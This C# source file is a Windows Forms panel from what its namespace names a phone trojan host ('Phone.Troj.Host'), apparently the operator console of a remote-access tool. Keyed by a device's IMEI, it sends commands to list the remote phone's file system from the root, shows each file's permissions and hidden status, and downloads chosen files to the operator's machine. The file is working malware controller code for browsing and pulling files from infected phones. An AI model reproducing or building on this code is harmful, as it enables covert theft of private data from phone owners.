using System;
using System.IO;
using System.Windows.Forms;
using InOut.Entity;
using InOut;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class ReadFilePanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;

        public ReadFilePanel(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
            btnDownload.Enabled = false;


        }

        private void btnDownload_Click(object sender, EventArgs e)
        {
            var myFile = (MyFile) tvFile.SelectedNode.Tag;
            string path = myFile.Path;
            string downPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, tbDownDir.Text);;
            string downName = myFile.Name;
            server.CommandFileSender(imei, Protocol.GetFile, path.GetBytes(), downPath, downName);
        }

        private void btnFileTree_Click(object sender, System.EventArgs e)
        {
            server.CommandSender(imei, Protocol.ListDir, "/".GetBytes());
        }


        public void UpdateFileTree(MyFile[] list)
        {
            
            if (list != null&&list.Length > 0)
            {
                Invoke(new MethodInvoker(() => UpdateFileTreeCore(list)));
            }
        }

        private void UpdateFileTreeCore(MyFile[] list)
        {
            tvFile.BeginUpdate();
            tvFile.SelectedNode = null;
            tvFile.Nodes.Clear();
            var rootFile = list[0];
            if (list.Length > 1)
            {
                rootFile = new MyFile
                {
                    IsDir = true,
                    IsFile = false,
                    Hidden = false,
                    Name = "/",
                    Path = "/",
                    List = list
                };
            }
            //tvFile.TopNode = new TreeNode(rootFile.Name){Tag =  rootFile};
            tvFile.Nodes.Add(new TreeNode(rootFile.Name) { Tag = rootFile });
            tvFile.SelectedNode = tvFile.TopNode;
            
            InitNode(tvFile.TopNode);
            tvFile.EndUpdate();
        }

        private void InitNode(TreeNode node)
        {
            var file = (MyFile) node.Tag;
            //TODO: 初始化目录文件图标
            if (file.List != null)
            {
                foreach (var myFile in file.List)
                {
                    var subNode = new TreeNode
                    {
                        Text = myFile.Name,
                        Name = myFile.Name,
                        Tag = myFile,
                    };
                    subNode.Tag = myFile;
                    node.Nodes.Add(subNode);
                    InitNode(subNode);
                }
            }
        }

        private void tvFile_DoubleClick(object sender, System.EventArgs e)
        {
            
        }

        private void tvFile_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (tvFile.SelectedNode != null)
            {
                
                var file = (MyFile)tvFile.SelectedNode.Tag;
                string permission = string.Empty;
                if (file.R)
                    permission += "可读";
                if (file.W)
                    permission += "可写";

                lbName.Text = string.Format("名称：{0}", file.Name);
                lbPermission.Text = string.Format("权限：{0}", permission);
                lbHide.Text = string.Format("隐藏：{0}", file.Hidden ? "是" : "否");
                lbSize.Text = string.Format("文件大小：{0}",file.IsDir ? "-/-" : file.Length.ToString());
                lbLastChange.Text = string.Format("最后修改时间：-/-");
                //TODO:格式化文件大小及文件最后修改时间
                btnDownload.Enabled = file.IsFile;
                
            }

        }

    }
}
